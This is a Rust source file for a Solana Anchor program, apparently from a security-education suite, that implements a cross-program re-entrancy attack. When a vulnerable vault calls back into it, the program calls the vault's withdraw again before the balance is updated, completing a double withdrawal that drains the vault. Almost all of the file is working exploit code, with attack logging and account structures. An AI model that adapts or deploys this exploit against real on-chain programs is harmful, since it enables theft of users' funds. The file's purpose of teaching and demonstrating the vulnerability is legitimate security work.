//! ⚠️  EDUCATIONAL PURPOSE ONLY - MALICIOUS CODE DEMONSTRATION ⚠️
//!
//! Attacker Program for CPI Re-entrancy Attack
//!
//! This program demonstrates how a malicious program can exploit re-entrancy
//! vulnerabilities in other Solana programs through CPI callbacks.
//!
//! DO NOT USE THIS CODE FOR MALICIOUS PURPOSES.
//! This is strictly for educational and security research purposes.
//!
//! Attack Flow:
//! 1. User initiates withdrawal from vulnerable vault
//! 2. Vulnerable vault makes CPI to this attacker program (callback)
//! 3. This program immediately re-enters vulnerable vault's withdraw
//! 4. Vulnerable vault checks balance (still old value) and allows withdrawal
//! 5. Attack completes - vault drained more than should be possible

use anchor_lang::prelude::*;
use anchor_lang::solana_program::{instruction::Instruction, program::invoke};

declare_id!("BY2ntBPnsu3LhtA92jHYWUR4RTCm85tC3bNRyZT9Vsu9");

/// Vulnerable program ID for CPI
pub const VULNERABLE_PROGRAM_ID: &str = "DW5PRzSRWd1oAS8mDiV915GNh1hvpWrs7dxehpdnkD6b";

#[program]
pub mod attacker_cpi_reentrancy {
    use super::*;

    /// Initialize attack state to track re-entrancy
    pub fn initialize_attack(ctx: Context<InitializeAttack>) -> Result<()> {
        let attack_state = &mut ctx.accounts.attack_state;
        attack_state.reentered = false;
        attack_state.attack_count = 0;
        attack_state.bump = ctx.bumps.attack_state;

        msg!("// ATTACK: Attack state initialized, ready to exploit");
        Ok(())
    }

    /// Reset attack state for multiple test runs
    pub fn reset_attack(ctx: Context<ResetAttack>) -> Result<()> {
        let attack_state = &mut ctx.accounts.attack_state;
        attack_state.reentered = false;
        attack_state.attack_count = 0;

        msg!("// ATTACK: Attack state reset");
        Ok(())
    }

    /// ATTACK: Receive callback from vulnerable vault and re-enter
    ///
    /// This is the core of the re-entrancy attack:
    /// - Called by vulnerable program during its withdrawal CPI
    /// - Immediately calls back into vulnerable program's withdraw
    /// - Exploits the fact that vulnerable program hasn't updated state yet
    pub fn receive_callback(ctx: Context<ReceiveCallback>, amount: u64) -> Result<()> {
        msg!("// ATTACK: ====== CALLBACK RECEIVED ======");
        msg!("// ATTACK: Amount from original withdrawal: {}", amount);

        let attack_state = &mut ctx.accounts.attack_state;

        // ATTACK: Check if we've already re-entered (prevent infinite recursion)
        // Solana CPI depth limit is 4, so we could go deeper, but one re-entry
        // is enough to demonstrate the vulnerability
        if attack_state.reentered {
            msg!("// ATTACK: Already re-entered once, stopping to demonstrate exploit");
            msg!("// ATTACK: In real attack, could continue until CPI depth limit (4)");
            attack_state.attack_count += 1;
            return Ok(());
        }

        // ATTACK: Mark that we're about to re-enter
        attack_state.reentered = true;
        attack_state.attack_count += 1;

        msg!("// ATTACK: State still shows old balance - time to exploit!");
        msg!("// ATTACK: Constructing re-entrancy CPI to vulnerable vault...");

        // ATTACK: Build the withdraw instruction to re-enter vulnerable program
        // The vulnerable program will check balance using PRE-CPI state and allow this!
        let withdraw_discriminator: [u8; 8] = [183, 18, 70, 156, 148, 109, 161, 34]; // "withdraw" discriminator

        let mut instruction_data = Vec::with_capacity(16);
        instruction_data.extend_from_slice(&withdraw_discriminator);
        instruction_data.extend_from_slice(&amount.to_le_bytes());

        let vulnerable_program_id =
            Pubkey::try_from(VULNERABLE_PROGRAM_ID).expect("Invalid program ID");

        let reentry_ix = Instruction {
            program_id: vulnerable_program_id,
            accounts: vec![
                // Vault account (mut)
                AccountMeta::new(ctx.accounts.vault.key(), false),
                // User deposit account (mut)
                AccountMeta::new(ctx.accounts.user_deposit.key(), false),
                // Authority (signer)
                AccountMeta::new_readonly(ctx.accounts.authority.key(), true),
                // Callback program (this attacker program)
                AccountMeta::new_readonly(ctx.accounts.attacker_program.key(), false),
                // Vulnerable program
                AccountMeta::new_readonly(ctx.accounts.vulnerable_program.key(), false),
                // Attack state
                AccountMeta::new(ctx.accounts.attack_state.key(), false),
            ],
            data: instruction_data,
        };

        msg!("// ATTACK: Executing re-entrancy CPI - DOUBLE WITHDRAWAL!");

        // ATTACK: Execute the re-entry CPI
        // This will succeed because vulnerable program hasn't updated its balance yet
        invoke(
            &reentry_ix,
            &[
                ctx.accounts.vault.to_account_info(),
                ctx.accounts.user_deposit.to_account_info(),
                ctx.accounts.authority.to_account_info(),
                ctx.accounts.attacker_program.to_account_info(),
                ctx.accounts.vulnerable_program.to_account_info(),
                ctx.accounts.attack_state.to_account_info(),
            ],
        )?;

        msg!("// ATTACK: ====== RE-ENTRANCY SUCCESSFUL! ======");
        msg!("// ATTACK: Double withdrawal completed!");
        msg!("// ATTACK: Vault has been drained beyond authorized amount");

        Ok(())
    }
}

// ============================================================================
// Constants
// ============================================================================

/// Anchor discriminator size
pub const DISCRIMINATOR_SIZE: usize = 8;

/// Attack state account size: 8 + 1 + 8 + 1 = 18 bytes
pub const ATTACK_STATE_SIZE: usize = DISCRIMINATOR_SIZE + 1 + 8 + 1;

/// Seed for attack state PDA
pub const ATTACK_STATE_SEED: &[u8] = b"attack_state";

// ============================================================================
// Account Structures
// ============================================================================

/// Tracks attack state to prevent infinite recursion
#[account]
pub struct AttackState {
    /// Whether we've already performed a re-entry attack
    pub reentered: bool,
    /// Count of attack attempts (for testing/logging)
    pub attack_count: u64,
    /// PDA bump
    pub bump: u8,
}

// ============================================================================
// Instruction Contexts
// ============================================================================

#[derive(Accounts)]
pub struct InitializeAttack<'info> {
    #[account(
        init,
        payer = attacker,
        space = ATTACK_STATE_SIZE,
        seeds = [ATTACK_STATE_SEED, attacker.key().as_ref()],
        bump
    )]
    pub attack_state: Account<'info, AttackState>,

    #[account(mut)]
    pub attacker: Signer<'info>,

    pub system_program: Program<'info, System>,
}

#[derive(Accounts)]
pub struct ResetAttack<'info> {
    #[account(
        mut,
        seeds = [ATTACK_STATE_SEED, attacker.key().as_ref()],
        bump = attack_state.bump
    )]
    pub attack_state: Account<'info, AttackState>,

    pub attacker: Signer<'info>,
}

#[derive(Accounts)]
pub struct ReceiveCallback<'info> {
    /// CHECK: Vault account from vulnerable program - passed through for CPI
    #[account(mut)]
    pub vault: UncheckedAccount<'info>,

    /// CHECK: User deposit account from vulnerable program - passed through for CPI
    #[account(mut)]
    pub user_deposit: UncheckedAccount<'info>,

    /// The authority performing the withdrawal (must sign)
    pub authority: Signer<'info>,

    /// CHECK: The vulnerable program to re-enter
    pub vulnerable_program: UncheckedAccount<'info>,

    /// Attack state tracking re-entrancy
    #[account(mut)]
    pub attack_state: Account<'info, AttackState>,

    /// CHECK: This attacker program's ID for CPI context
    pub attacker_program: UncheckedAccount<'info>,
}
